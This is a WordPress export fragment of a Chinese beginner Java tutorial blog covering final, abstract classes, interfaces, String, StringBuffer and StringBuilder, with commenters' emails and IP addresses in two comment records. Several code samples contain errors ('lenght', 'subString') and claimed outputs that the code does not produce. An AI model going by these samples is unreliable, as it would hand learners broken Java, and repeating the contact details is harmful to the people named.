							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_jetpack_related_posts_cache]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{s:32:"8f6677c9d6b0f903e98ad32ec61f8deb";a:2:{s:7:"expires";i:1453518009;s:7:"payload";a:3:{i:0;a:1:{s:2:"id";i:610;}i:1;a:1:{s:2:"id";i:702;}i:2;a:1:{s:2:"id";i:306;}}}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>27</wp:comment_id>
			<wp:comment_author><![CDATA[Jack Lee]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[mr9esx1138099359@hotmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[14.209.52.73]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-01-22 23:00:21]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-01-22 15:00:21]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[注册了！过来看看！ :a12:]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Java中的final关键字</title>
		<link>https://www.nervgeek.com/2016/01/23/java%e4%b8%ad%e7%9a%84final%e5%85%b3%e9%94%ae%e5%ad%97/</link>
		<pubDate>Sat, 23 Jan 2016 08:11:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=750</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . final可译为完结器，意译为最终。</strong>
<strong>2 . final可修饰类、方法、属性。</strong>

<p style="padding-left: 30px;">final修饰之后的类<strong>不能被继承</strong>。</p>

<p style="padding-left: 30px;">final修饰之后的方法<strong>不能被重写</strong>。</p>

<p style="padding-left: 30px;">final修饰之后的属性<strong>不能被更改</strong>。(变量变成常量)</p>

<!--more-->
<strong>示例代码一：类无法被继承</strong>

<pre>final class People{
//类被final修饰
}
class Student extends People{
//编译器报错，因为People类被final关键字修饰，无法继承
}
class Final{
    public static void main(String[] args){
        System.out.println("Over!");
    }
}</pre>

&nbsp;
<strong>示例代码二：方法无法被重写</strong>

<pre>class People{
    public final void tell(){
    //tell方法被final修饰
        System.out.println("Can’t OverWrite!");
    }
}
class Student extends People{
    public void tell(){
    //编译器报错，因为tell方法被final关键字修饰，无法重写
    }
}
class Final{
    public static void main(String[] args){
        System.out.println("Over!");
    }
}</pre>

&nbsp;
<strong>示例代码三：属性无法被更改(变量变成常量)</strong>

<pre>class Final{
    public static void main(String[] args){
        final String MyName = "Mr9esx";
        //名为MyName的String类型变量被final修饰，变成常量
        MyName = "Final!";
        //编译器报错，无法更改
    }
}</pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>750</wp:post_id>
		<wp:post_date><![CDATA[2016-01-23 16:11:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-23 08:11:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84final%e5%85%b3%e9%94%ae%e5%ad%97]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="final"><![CDATA[final]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%85%b3%e9%94%ae%e5%ad%97"><![CDATA[关键字]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[200]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的抽象类</title>
		<link>https://www.nervgeek.com/2016/01/23/java%e4%b8%ad%e7%9a%84%e6%8a%bd%e8%b1%a1%e7%b1%bb/</link>
		<pubDate>Sat, 23 Jan 2016 09:16:42 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=753</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 一个类之中包含了抽象方法，该类就是抽象类。</strong>
<strong>2 . 抽象方法即是：被声明却未被实现并使用abstract关键字修饰的方法。</strong>
<strong>3 . 不能对抽象类直接实例化(假如Demo是抽象类，Demo d = new Demo();将报错)，抽象类必须被子类所继承之后，重写抽象类中的所有抽象方法，然后实例化继承抽象类的子类，才能使用(子类本身也不能是抽象类)。</strong>
<!--more-->
<strong>示例代码：</strong>

<pre>abstract class Abs{
//抽象类
    private String Name;
    public void tell(){
    //普通的方法
    }
    public abstract void tellName();
    //抽象方法
    
    //子类无法调用父类的私有成员，需要使用方法调用
    public String getName(){
        return Name;
    }
    public void setName(String Name){
        this.Name = Name;
    }
}
class Abs_child extends Abs{
//Abs_child子类继承Abs抽象类
    public void tellName(){
    //重写Abs抽象类中的抽象方法
        System.out.println(getName());
    }
}
class abstractDemo{
    public static void main(String[] args){
        Abs a = new Abs();
        //直接实例化抽象类会导致编译器报错
        Abs_child ac = new Abs_child();
        ac.setName("Mr9esx");
        ac.tellName();
        //正确使用方法
    }
}</pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>753</wp:post_id>
		<wp:post_date><![CDATA[2016-01-23 17:16:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-23 09:16:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e6%8a%bd%e8%b1%a1%e7%b1%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="abstract"><![CDATA[abstract]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%85%b3%e9%94%ae%e5%ad%97"><![CDATA[关键字]]></category>
		<category domain="post_tag" nicename="%e6%8a%bd%e8%b1%a1%e7%b1%bb"><![CDATA[抽象类]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[216]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的接口以及接口和抽象类的区别</title>
		<link>https://www.nervgeek.com/2016/01/24/java%e4%b8%ad%e7%9a%84%e6%8e%a5%e5%8f%a3/</link>
		<pubDate>Sun, 24 Jan 2016 08:50:34 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=755</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 接口可以理解成一个特殊的类，其组成全都是全局常量以及公共的抽象方法所组成。</strong>
<strong>2 . 使用interface关键字来修饰。</strong>
<strong>3 . 接口必须经过子类来实现，使用implements关键字修饰，Java中继承只能单继承，但接口可以多实现。</strong>
<strong>4 . 子类可以同时继承一个抽象类以及多个实现接口。</strong>
<strong>5 . 接口可以通过extends关键字继承多个接口。</strong>
<!--more-->
<strong>示例代码：</strong>

<pre>interface Inter_1{
//接口一
    public static final String NAME = "Mr9esx";
    public static final int AGE = 20;
    public abstract void tell();
}
interface Inter_2{
//接口二
    public static final String EMAIL = "1138099359@qq.com";
    public static final String SEX = "Boy";
    public abstract void say();
}
abstract class Abs{
//抽象类
    public abstract void print();
}
interface Inter_3 extends Inter_1,Inter_2{
//接口可以通过extends继承多个接口
}
class Inter_child extends Abs implements Inter_1,Inter_2{
//子类可以同时继承一个抽象类和多个实现接口
    public void tell(){
        System.out.println("Hi!");
    }
    public void say(){
        System.out.println("Hello!");
    }
    public void print(){
        System.out.println("Bye!");
    }
}
class imp{
    public static void main(String[] args){
        //Inter i = new Inter();
        //不能直接实例化，必须由子类来实现
        Inter_child Ic = new Inter_child();
        Ic.tell();
        Ic.say();
        System.out.println(Ic.NAME);
        System.out.println(Ic.AGE);
        System.out.println(Ic.EMAIL);
        System.out.println(Ic.SEX);
        //因为属性都是全局常量，可以直接调用
        System.out.println(Inter_1.NAME);
        System.out.println(Inter_1.AGE);
        Ic.print();
        //调用print方法成功，证明可以同时继承一个抽象类
    }
}</pre>

&nbsp;
Java接口和Java抽象类最大的一个区别，就在于Java抽象类可以提供某些方法的部分实现，接口只能全部都是抽象方法。
实现接口的一定要实现接口里定义的所有方法，而实现抽象类可以有选择地重写需要用到的方法，一般的应用里，最顶级的是接口，然后是抽象类实现接口，最后才到具体类实现。
接口可以实现多重继承，而一个类只能继承一个超类，但可以通过继承多个接口实现多重继承。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>755</wp:post_id>
		<wp:post_date><![CDATA[2016-01-24 16:50:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-24 08:50:34]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e6%8e%a5%e5%8f%a3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="implements"><![CDATA[implements]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%85%b3%e9%94%ae%e5%ad%97"><![CDATA[关键字]]></category>
		<category domain="post_tag" nicename="%e6%8e%a5%e5%8f%a3"><![CDATA[接口]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[265]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中String类型的常用方法</title>
		<link>https://www.nervgeek.com/2016/01/24/java%e4%b8%adstring%e7%b1%bb%e5%9e%8b%e7%9a%84%e5%b8%b8%e7%94%a8%e6%96%b9%e6%b3%95/</link>
		<pubDate>Sun, 24 Jan 2016 12:04:44 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=759</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 计算字符串长度</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.lenght());
    }
}</pre>

&nbsp;
&nbsp;
<strong>2 . 字符串转换为数组</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        char strArr[] = str.toCharArray();
        for(int count = 0;count < strArr.lenght;count++){
            System.out.println(strArr[count]+"-");
        }
    }
}</pre>

<!--more-->
<strong>3 . 取出字符串指定位置的字符</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.charAt(4));
    }
}</pre>

&nbsp;
<strong>4 . 字符串转换为Byte数组</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        byte strByte[] = str.getBytes();
        for(int count = 0;count < strByte.lenght;count++){
            System.out.println(new String(strByte)+" ");
        }
    }
}</pre>

&nbsp;
<strong>5 . 过滤字符串中的字符</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.indexOf("e"));
        //返回3，因为是从0开始数
    }
}</pre>

&nbsp;
<strong>6 . 去掉字符串前后的空格</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.trim());
    }
}</pre>

&nbsp;
<strong>7 . 从字符串中截取一段字符串</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.subString(1,3));
        //从第二个字符截取到第四个字符。
    }
}</pre>

&nbsp;
<strong>8 . 字符串大小写转换</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.toLowerCase());
        //全部转换成小写
        System.out.println(str.toUpperCase());
        //全部转换成大写
    }
}</pre>

&nbsp;
<strong>9 . 判断字符串开头与结尾的字符</strong>

<pre>class StringFunction{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str.endsWith("x"));
        System.out.println(str.endsWith("s"));
        System.out.println(str.startsWith("M"));
        System.out.println(str.startsWith("N"));
        //如果有，返回true，没有返回false
    }
}</pre>

&nbsp;
未完待续。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>759</wp:post_id>
		<wp:post_date><![CDATA[2016-01-24 20:04:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-24 12:04:44]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%adstring%e7%b1%bb%e5%9e%8b%e7%9a%84%e5%b8%b8%e7%94%a8%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="string"><![CDATA[String]]></category>
		<category domain="post_tag" nicename="%e6%96%b9%e6%b3%95"><![CDATA[方法]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[198]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的StringBuffer</title>
		<link>https://www.nervgeek.com/2016/01/24/java%e4%b8%ad%e7%9a%84stringbuffer/</link>
		<pubDate>Sun, 24 Jan 2016 15:14:15 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=763</guid>
		<description></description>
		<content:encoded><![CDATA[Java中除了String字符串类型，还有一个和String不一样的字符串，叫StringBuffer，字符串缓冲区。StringBuffer与String最大的区别就是，String每被更改一次，就会开辟一个新的内存空间存储新的字符串，多次赋值就会占内存，而StringBuffer则不会。
主要介绍StringBuffer的四种使用方法：append、insert、replace、indexOf
<!--more-->
<strong>示例代码(append)：</strong>

<pre>class StringBufferDemo{
    public static void main(String[] args){
        StringBuffer SB = new StringBuffer();
        SB.append("Mr9esx");
        //添加字符串
        System.out.println(SB.toString());
        changeString(SB);
        //在原本的字符串后面追加字符串
        System.out.println(SB.toString());
    }
    public static void changeString(StringBuffer change){
    //在原本的字符串后面追加字符串   
        change.append(" From NervGeek");
    }
}
/*
输出:
Mr9esx
Mr9esx From NervGeek
*/</pre>

在String中，原本的字符串不会被修改。示例代码为：

<pre>class StringCantChangeDemo{
    public static void main(String[] args){
        String str = "Mr9esx";
        System.out.println(str);
        CantChangeString(str);
        System.out.println(str);
    }
    public static void CantChangeString(String change){
        change = "NervGeek";
    }
}
/*
输出:
Mr9esx
Mr9esx
*/</pre>

&nbsp;
<strong>示例代码(insert)：</strong>

<pre>class StringBufferDemo{
    public static void main(String[] args){
        StringBuffer SB = new StringBuffer();
        SB.append("Mr9esx");
        SB.insert(0,"I am ");
        //从第一个字符前面开始插入
        System.out.println(SB.toString());
    }
}
/*
输出：
I am Mr9esx
*/</pre>

&nbsp;
<strong>示例代码(replace)：</strong>

<pre>class StringBufferDemo{
    public static void main(String[] args){
        StringBuffer SB = new StringBuffer();
        SB.append("Mr9esx");
        SB.replace(0,2,"Mrs");
        //从第一个字符前面到第三个字符前面替换
        System.out.println(SB.toString());
    }
}
/*
输出：
Mrs9esx
*/</pre>

&nbsp;
<strong>示例代码(indexOf)：</strong>

<pre>class StringBufferDemo{
    public static void main(String[] args){
        StringBuffer SB = new StringBuffer();
        SB.append("Mr9esx");
        System.out.println(SB.indexOf("9"));
        //在字符串里寻找字符“9”的位置
    }
}
/*
输出：
2
*/</pre>

&nbsp;
<strong>StringBuffer和String的对比：</strong>

<pre>class StringDemo{
    public static void main(String[] args){
        String str = "";
        for(int count = 0;count < 100;count++){
            str = str+count;
        }
        System.out.println(str);
    }
}
class StringBufferDemo{
    public static void main(String[] args){
        StringBuffer strb = new StringBuffer();
        for(int count = 0;count < 100;count++){
            strb.append(count);
        }
        System.out.println(strb);
    }
}
/*
均输出：
0-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-
16-17-18-19-20-21-22-23-24-25-26-27-28-
29-30-31-32-33-34-35-36-37-38-39-40-41-
42-43-44-45-46-47-48-49-50-51-52-53-54-
55-56-57-58-59-60-61-62-63-64-65-66-67-
68-69-70-71-72-73-74-75-76-77-78-79-80-
81-82-83-84-85-86-87-88-89-90-91-92-93-
94-95-96-97-98-99-
但是从速度以及内存占用来看，无疑是StringBuffer更好。
*/</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>763</wp:post_id>
		<wp:post_date><![CDATA[2016-01-24 23:14:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-24 15:14:15]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84stringbuffer]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="buffer"><![CDATA[buffer]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="string"><![CDATA[String]]></category>
		<category domain="post_tag" nicename="stringbuffer"><![CDATA[stringbuffer]]></category>
		<category domain="post_tag" nicename="%e5%ad%97%e7%ac%a6%e4%b8%b2"><![CDATA[字符串]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[245]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>28</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.95.238.189]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-01-24 23:23:16]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-01-24 15:23:16]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:a4: 爆肝转移笔记]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Java中的StringBuilder</title>
		<link>https://www.nervgeek.com/2016/01/25/java%e4%b8%ad%e7%9a%84stringbuilder/</link>
		<pubDate>Mon, 25 Jan 2016 09:25:09 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=772</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . StringBuilder和StringBuffer在使用方法上是极其相像的，最大的区别是StringBuilder是非线程安全，StringBuffer是线程安全。在单线程模式下，StringBuilder会比StringBuffer更快，但是考虑到线程安全方面的时候，更建议使用StringBuffer。</strong>
<!--more-->
<strong>示例代码(append)：</strong>

<pre>class StringBuilderDemo{
    public static void main(String[] args){
        StringBuilder SB = new StringBuilder();
        SB.append("Mr9esx");
        System.out.println(SB.toString());
    }
}
/*
输出:
Mr9esx
Mr9esx From NervGeek
*/</pre>

&nbsp;
<strong>示例代码(insert)：</strong>

<pre>class StringBuilderDemo{
    public static void main(String[] args){
        StringBuilder SB = new StringBuilder();
        SB.append("Mr9esx");
        SB.insert(0,"I am ");
        //从第一个字符前面开始插入
        System.out.println(SB.toString());
    }
}
/*
输出：
I am Mr9esx
*/</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>772</wp:post_id>
		<wp:post_date><![CDATA[2016-01-25 17:25:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-25 09:25:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84stringbuilder]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="builder"><![CDATA[builder]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="string"><![CDATA[String]]></category>
		<category domain="post_tag" nicename="stringbuilder"><![CDATA[stringbuilder]]></category>
		<category domain="post_tag" nicename="%e5%ad%97%e7%ac%a6%e4%b8%b2"><![CDATA[字符串]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[160]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的接口应用例子</title>
		<link>https://www.nervgeek.com/2016/01/26/java%e4%b8%ad%e7%9a%84%e6%8e%a5%e5%8f%a3%e5%ba%94%e7%94%a8%e4%be%8b%e5%ad%90/</link>
		<pubDate>Tue, 26 Jan 2016 12:02:19 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=775</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>interface UsbStatus{
    void search();
    void startWork();
    void stopWork();
    void error();
}
class UsbDevice implements UsbStatus{
    public String Device;
    public UsbDevice(String Device){
        this.Device = Device;
    }
    public void search(){
        System.out.println("检测到 "+Device+" 已插入！");
    }
    public void startWork(){
        System.out.println(Device+"正在工作！");
    }
    public void stopWork(){
        System.out.println(Device+"已停止工作！");
    }
    public void error(){
        System.out.println(Device+"发生错误！");
        stopWork();
    }
}
class DeviceWork{
    public static void work(UsbStatus usb){
        usb.search();
        usb.startWork();
        usb.stopWork();
    }
    public static void work(UsbStatus usb,int error){
        usb.search();
        usb.startWork();
        if(error==1){
           usb.error();
        }
    }
}
class ImplementsDemp{
    public static void main(String[] args){
        DeviceWork.work(new UsbDevice("U盘"));
        DeviceWork.work(new UsbDevice("U盘"),1);
    }
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>775</wp:post_id>
		<wp:post_date><![CDATA[2016-01-26 20:02:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-26 12:02:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
